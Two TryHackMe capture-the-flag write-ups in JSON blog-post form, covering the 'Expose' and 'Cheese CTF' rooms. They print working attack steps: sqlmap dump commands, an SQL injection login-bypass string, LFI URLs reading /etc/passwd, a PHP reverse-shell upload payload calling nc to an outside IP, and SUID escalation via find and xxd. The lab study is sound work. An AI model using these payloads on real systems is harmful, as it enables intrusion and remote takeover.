[
  
  {
    "title": "TryHackMe | Expose",
    "url": "/posts/Expose/",
    "categories": "TryHackMe",
    "tags": "thm, ctf, writeup",
    "date": "2025-08-22 03:00:00 +0100",
    "content": "Reconnaissance  For initial reconnaissance, I used this nmap command to scan for open ports: sudo nmap -sS -sV -p- 10.10.188.185    We can see that there is a web server on port 1337. Accessing the site at http://10.10.188.185:1337 shows us a basic HTML page. To enumerate further, I ran ffuf:    We find two endpoints: admin and admin_101.  SQLi and Database Dump  Visiting /admin_101, we see that the email field is already set. Looking at the page source shows that the request is sent via POST:    I intercepted the POST request and saved it to reqsq.txt, then tested it with sqlmap:    After some time, sqlmap reported that the email parameter is vulnerable!    From there, I dumped the database with: sqlmap -r reqsq.txt --batch --level=5 --risk=3 --dump  The dump revealed two tables: user and config.      Using the password on /admin_101, we gain access to this webpage:    LFI and RCE  When we try the first URL from the config table (with its corresponding password), we are met with this message:    Viewing the page source gives us a hint:    So we try just that, we can test the parameter by adding ?file=&lt;file_to_read&gt; to the URL, this will allows us to read files that we have permissions to read. So we test with a world readable file like /etc/passwd:  Full URL: http://10.10.137.122:1337/file1010111/index.php?file=/etc/passwd    And we have an LFI!  Checking /etc/passwd, I looked for entries with /home. We find two: zeamkish and ubuntu.  Next, we move to the second URL from the config table: /upload-cv00101011/index.php. This page prompts us for the username starting with “z”. Entering zeamkish gets us in:    Now we can upload files. Looking at the source code, we see client-side sanitization restricting uploads to .png or .jpg extensions.  Double extensions didn’t work, but we can bypass the check using Burp Suite. Intercepting the request, I changed the filename to shell.php, kept the Content-Type: image/png, and inserted my reverse shell payload:  &lt;?php system(\"mkfifo /tmp/f; nc 10.21.239.111 666 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1\"); ?&gt;  After sending it, we get a message in the response saying:  File uploaded successfully! Maybe look in source code to see the path.  The source revealed the upload path: /upload_thm_1001.    With a listener set, visiting: http://10.10.137.122:1337/upload-cv00101011/upload_thm_1001/shellbwip.php gives us a shell!    User flag  For the user flag, I checked the home directory /home/zeamkish. Inside, there was a .txt file containing his SSH credentials:    Using SSH with those credentials gave me a proper shell as zeamkish, and I was able to grab the user flag from flag.txt.  Root flag  For privilege escalation, I looked for SUID binaries with: find / -type f -perm -04000 -ls 2&gt;/dev/null  Among the list, I noticed the find binary.  With a simple search using https://gtfobins.github.io , we can escalate to root using:  ./find . -exec /bin/sh -p \\; -quit    And just like that — root access obtained and the final flag captured "
  },
  
  {
    "title": "TryHackMe | Cheese CTF",
    "url": "/posts/Cheese_CTF/",
    "categories": "TryHackMe",
    "tags": "thm, ctf, writeup",
    "date": "2025-08-20 03:00:00 +0100",
    "content": "Summary  In this room, we leverage an SQL injection exploit to bypass authentication on a login page. Further investigation on the webpage reveals an LFI vulnerability that allows us to achieve RCE via a crafted PHP payload using PHP filters. After obtaining a shell with a system account, we can escalate to user by creating and adding our RSA key to the authorized_keys file of the user comte. To gain the root shell, we have to edit a script that activates a SUID binary, which we can leverage to read and write files.  Reconnaissance  In the reconnaissance phase, I started by using Nmap to enumerate the open ports. After a while, Nmap returned a very long list. We can see that a lot of ports of interest are open, such as HTTP and SSH.      We can access the webpage by visiting http://10.10.15.229:80/.    I tried enumerating folders, but it didn’t lead anywhere.    While browsing the site, we find a login page at http://10.10.15.229:80/login.php.    SQLi Authentication Bypass  I tried testing basic login credentials like admin:admin and admin:Password123, but nothing worked. So, I intercepted a login POST request using Burp Suite and tested it with SQLMap for SQL injection. SQLMap reported that the username parameter appeared to be injectable.      I initially tried to dump the database, which was successful and revealed a single user. However, the password hash associated with the user was uncrackable using online sites like CrackStation and others.    Knowing the username parameter was injectable, I tried some payloads, and eventually this one worked: ' || 1=1;-- -  This allowed us to bypass the authentication process.    LFI and RCE  Visiting the messages section of the site, we see a clickable link that takes us to a page with the message:    If you know, you know :D   Upon further inspection, we realize the URL is using a file parameter along with a filter:  http://10.10.15.229/secret-script.php?file=php://filter/resource=supersecretmessageforadmin  A simple test to try reading a world-readable file turns out to be successful.    We have an LFI!  We can use the convert.base64-encode filter to read the secret-script.php file like so:    To get a reverse shell, we need to use this tool: PHP filter chain generator  We set our Netcat listener and then create and send our payload.    And we have a shell!    User Flag  When we access the user comte’s home directory, we can access the .ssh folder and find an authorized_keys file.    Since the file is writable, we can generate an SSH key and add it to the file to get a shell as comte.      Now we connect via SSH:    Root Flag  When we check the sudo privileges for comte, we see:    The user can reload the configuration files for systemd and start a script called exploit.timer, which in turn starts the service exploit.service. Let’s see the script:    Let’s try running the script:    It won’t run! That’s because the OnBootSec= parameter is empty, which specifies to systemd when to start the timer after reload. Let’s add the missing value and execute the script.    Now, checking for binaries with the SUID bit set reveals a binary called xxd.    Looking it up on GTFOBins, we see that it can be abused to read files. We use it to read the root flag:   "
  }
  
]

